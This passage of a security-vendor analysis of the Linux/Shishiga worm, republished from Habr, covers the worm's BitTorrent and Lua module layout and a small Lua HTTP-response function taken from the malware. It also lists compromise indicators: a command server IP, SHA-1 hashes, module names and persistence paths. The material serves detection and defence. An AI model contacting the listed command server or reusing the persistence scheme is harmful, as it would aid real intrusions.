class="hljs-string">"i686.dm"</span></span>, <span class="hljs-string"><span class="hljs-string">"mips.dm"</span></span>, <span class="hljs-string"><span class="hljs-string">"mipsel.dm"</span></span> ], <span class="hljs-string"><span class="hljs-string">"bt"</span></span>:[ (<span class="hljs-number"><span class="hljs-number">3</span></span>) <span class="hljs-string"><span class="hljs-string">"script.bt"</span></span>, <span class="hljs-string"><span class="hljs-string">"server.bt"</span></span>, <span class="hljs-string"><span class="hljs-string">"update.bt"</span></span> ], <span class="hljs-string"><span class="hljs-string">"version"</span></span>:<span class="hljs-string"><span class="hljs-string">"1.0.0"</span></span>, (<span class="hljs-number"><span class="hljs-number">4</span></span>) <span class="hljs-string"><span class="hljs-string">"lua"</span></span>:[ (<span class="hljs-number"><span class="hljs-number">5</span></span>) <span class="hljs-string"><span class="hljs-string">"armv4l.lm"</span></span>, <span class="hljs-string"><span class="hljs-string">"i686.lm"</span></span>, <span class="hljs-string"><span class="hljs-string">"mips.lm"</span></span>, <span class="hljs-string"><span class="hljs-string">"mipsel.lm"</span></span>, <span class="hljs-string"><span class="hljs-string">"powerpc.lm"</span></span> ], <span class="hljs-string"><span class="hljs-string">"os"</span></span>:<span class="hljs-string"><span class="hljs-string">"lin"</span></span>, <span class="hljs-string"><span class="hljs-string">"arch"</span></span>:<span class="hljs-string"><span class="hljs-string">"i686"</span></span>, <span class="hljs-string"><span class="hljs-string">"lua_version"</span></span>:<span class="hljs-string"><span class="hljs-string">"Lua 5.3"</span></span> }</code> </pre> <br>  <b>(1)</b> Lua scripts <br>  <b>(2)</b> backdoor (old name: .dl) <br>  <b>(3)</b> BitTorrent scripts <br>  <b>(4)</b> Malvari version <br>  <b>(5)</b> module loader <br><br>  A request to the root / port 8888 will result in HTTP / 1.0 404 OK, which is a simple indicator of compromise (IoC). <br><br>  Http.lua answer function <br><pre> <code class="lua hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">http.response</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(req,code,data,timeout)</span></span></span></span> timeout=timeout <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> timeoutDef <span class="hljs-keyword"><span class="hljs-keyword">local</span></span> hdr=<span class="hljs-string"><span class="hljs-string">"HTTP/1.0 %d OK\r\nContent-Length: %d\r\nConnection: close\r\n\r\n"</span></span> async.sendall(req.sock,hdr:<span class="hljs-built_in"><span class="hljs-built_in">format</span></span>(code,data:<span class="hljs-built_in"><span class="hljs-built_in">len</span></span>())..data,timeout) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-literal"><span class="hljs-literal">true</span></span> <span class="hljs-keyword"><span class="hljs-keyword">end</span></span></code> </pre> <br>  At this stage of the study, we asked the <a href="https://censys.io/">Censys</a> team to conduct a massive Internet scan on TCP port 8888. They found about ten IP addresses on which the HTTP response coincided.  These addresses belong to potentially infected machines. <br><br><h3>  Conclusion </h3><br>  At first glance, Linux / Shishiga may seem similar to other malicious programs that spread through the weak Telnet and SSH, but it is distinguished by the use of the BitTorrent protocol and Lua modules.  BitTorrent in the <a href="https://security.rapiditynetworks.com/publications/2016-10-16/hajime.pdf">Hajime</a> worm, inspired by Mirai, was discovered last year, and we can only guess if it will become more popular in the future. <br><br>  It is possible that Shishiga is evolving and will be more common.  So far, a small number of victims, changes to components, comments in the code, and information on eliminating bugs indicate that work on the software is in progress.  To prevent your device from infecting Shishiga with malware and similar worms, you should not use standard Telnet and SSH credentials. <br><br>  We thank the Censys team for their cooperation. <br><br><h3>  Infection Indicators (IoC) </h3><br>  <b>Command server</b> <br>  93.117.137.35 <br><br>  <b>SHA-1 (.lm)</b> <br><pre> <code class="hljs go"><span class="hljs-number"><span class="hljs-number">003f</span></span>548796fb52ad281ae82c7e0bb7532dd34241 <span class="hljs-number"><span class="hljs-number">1</span></span>a79092c6468d39a10f805c96ad7f8bf303b7dc8 <span class="hljs-number"><span class="hljs-number">1</span></span>cc1b97f8f9bb7c4f435ef1316e08e5331b4331b <span class="hljs-number"><span class="hljs-number">2889803777e2d</span></span>fec7684512f45e87248a07d508f <span class="hljs-number"><span class="hljs-number">2</span></span>a809d37be5aa0655f5cc997eb62683e1b45da17 <span class="hljs-number"><span class="hljs-number">3f</span></span>1ef05ca850e2f5030ee279b1c589c9e3cc576c <span class="hljs-number"><span class="hljs-number">41</span></span>bf0d5612ba5bc9a05e9d94df0f841b159264a0 <span class="hljs-number"><span class="hljs-number">4</span></span>bc106f6231daa6641783dd9276b4f5c7fc41589 <span class="hljs-number"><span class="hljs-number">4d</span></span>55efe18643d7408cbe12dd4f319a68084bd11e <span class="hljs-number"><span class="hljs-number">4d</span></span>f58ab26f0fc8ec2d1513611ca2b852e7107096 <span class="hljs-number"><span class="hljs-number">51</span></span>a4ca78ebb0649721ae472290bea7bfe983d727 <span class="hljs-number"><span class="hljs-number">5</span></span>a88b67d8dfaf1f68308311b808f00e769e39e46 <span class="hljs-number"><span class="hljs-number">6458</span></span>c48e5167a2371d9243d4b47ad191d642685b <span class="hljs-number"><span class="hljs-number">688</span></span>ccbca8b2918a161917031e21b6810c59eeab0 <span class="hljs-number"><span class="hljs-number">6e3</span></span>ba86d1f91669e87945b8ea0211b58e315e189 <span class="hljs-number"><span class="hljs-number">6f</span></span>41c8f797814e2e3f073601ce81e8adceef6a27 <span class="hljs-number"><span class="hljs-number">8</span></span>a0d58472f6166ade0ae677bab7940fe38d66d35 <span class="hljs-number"><span class="hljs-number">8</span></span>a1f9212f181e68a63e06a955e64d333b78c6bf6 <span class="hljs-number"><span class="hljs-number">8e3</span></span>c4eb04d4cfd8f44c721111c5251d30ac848b6 <span class="hljs-number"><span class="hljs-number">979f</span></span>b376d6adc65473c4f51ad1cc36e3612a1e73 a1f2535576116d93b62d7f5fc6e30e66e0e0a216 a694c6ecc2ff9702905f22b14ed448e9e76fe531 ac094b239851eaf2e9fd309285c0996fb33771a8 b14f7af9665ef77af530109a0331f8ca0bd2a167 b86935c4539901cdec9081d8a8ca915903adaff1 ba5df105496b0c4df7206d29fa544b7a7a346735 bf4d9e25fc210a1d9809aebb03b30748dd588d08 c22f0fb01c6d47957732a8b0f5ef0f7d4e614c79 ce4b3c92a96137e6215a5e2f5fd28a672eddaaab d8a5d9c4605b33bd47fedbad5a0da9928de6aa33 f73022a4801e06d675e5c3011060242af7b949ad</code> </pre> <br>  <b>SHA-1 (.dl)</b> <br><pre> <code class="hljs go"><span class="hljs-number"><span class="hljs-number">274181d</span></span>2f9c6b8f0e217db23f1d39aa94c161d6e <span class="hljs-number"><span class="hljs-number">8</span></span>abbb049bffd679686323160ca4b6a86184550a1 <span class="hljs-number"><span class="hljs-number">95444</span></span>c2ccc5fff19145d60f1e817fd682cabe0cd <span class="hljs-number"><span class="hljs-number">9</span></span>cde845852653339f67667c2408126f02f246949</code> </pre> <br>  <b>Lua Script File Names</b> <br><pre> <code class="hljs css"><span class="hljs-selector-tag"><span class="hljs-selector-tag">async</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">async</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.old</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">bencode</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">bfssh</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">bfssh</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.old2</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">bftelnet</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">btloader</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">callhome</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">callhome</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.old</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">config</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">crypto</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">dht</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">event</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">evs</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">http</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">httpproto</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">libevent2</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">luaevent</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">main</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">main2</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">malware</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">persist</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">readme</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">routing</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">scanner</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">scanner2</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">server</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">socket</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">socks</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">ssh</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">ssl</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">telnet</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">test</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">test1</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">test10</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">test2</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">test3</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">test5</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">test6</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">threads</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">torrent</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">udp</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">utils</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">worm</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.lua</span></span></code> </pre> <br>  <b>Files that could potentially indicate infection</b> <br><pre> <code class="hljs bash">/tmp/.<span class="hljs-built_in"><span class="hljs-built_in">local</span></span>/* /tmp/drop /tmp/srv <span class="hljs-variable"><span class="hljs-variable">$HOME</span></span>/.<span class="hljs-built_in"><span class="hljs-built_in">local</span></span>/ssh.txt <span class="hljs-variable"><span class="hljs-variable">$HOME</span></span>/.<span class="hljs-built_in"><span class="hljs-built_in">local</span></span>/telnet.txt <span class="hljs-variable"><span class="hljs-variable">$HOME</span></span>/.<span class="hljs-built_in"><span class="hljs-built_in">local</span></span>/nodes.cfg <span class="hljs-variable"><span class="hljs-variable">$HOME</span></span>/.<span class="hljs-built_in"><span class="hljs-built_in">local</span></span>/check <span class="hljs-variable"><span class="hljs-variable">$HOME</span></span>/.<span class="hljs-built_in"><span class="hljs-built_in">local</span></span>/script.bt <span class="hljs-variable"><span class="hljs-variable">$HOME</span></span>/.<span class="hljs-built_in"><span class="hljs-built_in">local</span></span>/update.bt <span class="hljs-variable"><span class="hljs-variable">$HOME</span></span>/.<span class="hljs-built_in"><span class="hljs-built_in">local</span></span>/server.bt <span class="hljs-variable"><span class="hljs-variable">$HOME</span></span>/.<span class="hljs-built_in"><span class="hljs-built_in">local</span></span>/syslog <span class="hljs-variable"><span class="hljs-variable">$HOME</span></span>/.<span class="hljs-built_in"><span class="hljs-built_in">local</span></span>/syslog.pid <span class="hljs-variable"><span class="hljs-variable">$HOME</span></span>/.<span class="hljs-built_in"><span class="hljs-built_in">local</span></span>/{armv4l,i686,mips,mipsel}.{dl,dm} <span class="hljs-variable"><span class="hljs-variable">$HOME</span></span>/.<span class="hljs-built_in"><span class="hljs-built_in">local</span></span>/{armv4l,i686,mips,mipsel,powerpc}.lm</code> </pre> <br><pre> <code class="hljs swift">/etc/rc2.d/<span class="hljs-type"><span class="hljs-type">S04syslogd</span></span> /etc/rc3.d/<span class="hljs-type"><span class="hljs-type">S04syslogd</span></span> /etc/rc4.d/<span class="hljs-type"><span class="hljs-type">S04syslogd</span></span> /etc/rc5.d/<span class="hljs-type"><span class="hljs-type">S04syslogd</span></span> /etc/<span class="hljs-keyword"><span class="hljs-keyword">init</span></span>.d/syslogd /bin/syslogd /etc/cron.hourly/syslogd</code> </pre> <br>  <i>We remind you about a 50% discount when migrating to <a href="https://www.esetnod32.ru/buy/actions/business/50-mgnoveniy-vesny-/%3Futm_source%3Dhabrahabr%26utm_medium%3Darticle_23_03_2017%26utm_content%3Dfrom%26utm_campaign%3Dhabrahabr">ESET NOD32</a> corporate solutions from products from other manufacturers.</i> </div><p>Source: <a href="https://habr.com/ru/post/327824/">https://habr.com/ru/post/327824/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../327804/index.html">The first decade of augmented reality</a></li>
<li><a href="../327806/index.html">Repair without screwdrivers, COM ports and 7 years of spare parts availability: how iron reliability is provided for stores</a></li>
<li><a href="../327810/index.html">No ruby ‚Äã‚Äãone</a></li>
<li><a href="../327820/index.html">The past and the future of cellular communication in areas where there is no GSM</a></li>
<li><a href="../327822/index.html">4 cool game development stuff</a></li>
<li><a href="../327834/index.html">How to write logs (?)</a></li>
<li><a href="../327836/index.html">Part 1. Where to store data for decentralized applications on the blockchain?</a></li>
<li><a href="../327838/index.html">We live and work not in capitals: software development market in Nizhny Novgorod</a></li>
<li><a href="../327842/index.html">MP3 finally goes public domain</a></li>
<li><a href="../327844/index.html">Dell EMC Announces ESG 2017 IT Transformation Maturity Curve Survey Results</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>